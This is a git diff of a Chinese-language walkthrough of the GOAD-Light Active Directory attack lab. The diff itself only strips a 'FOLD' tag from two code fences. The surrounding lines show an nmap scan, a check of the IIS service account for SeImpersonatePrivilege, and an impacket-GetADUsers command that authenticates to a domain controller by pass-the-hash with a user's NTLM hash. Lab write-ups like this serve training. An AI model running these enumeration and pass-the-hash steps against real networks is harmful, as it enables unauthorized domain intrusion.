@@ -73,7 +73,7 @@ nmap -sC -sV -O castelblack.north.sevenkingdoms.local -oN castelblack.txt
 使用`whoami /all`查看`iis apppool\defaultapppool`用户权限，通常情况下，iss或者mysql这里服务类型用户都存在`SeImpersonatePrivilege`权限。
 ![](assets/GOAD-Light/Pasted_image_20260704224706.png)
 `systeminfo`查看操作系统版本：
-``` FOLD
+``` 
 Host Name:                 CASTELBLACK
 OS Name:                   Microsoft Windows Server 2019 Datacenter Evaluation
 OS Version:                10.0.17763 N/A Build 17763
@@ -171,7 +171,7 @@ bloodhound-python存在bug问题，在GitHub上可以找到[issue](https://githu
 impacket-GetADUsers north.sevenkingdoms.local/robb.stark -hashes :831486ac7f26860c9e2f51ac91e1a07a -dc-ip 192.168.56.11 -all
 ```
 执行结果：
-``` FOLD
+``` 
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Querying 192.168.56.11 for information about domain.
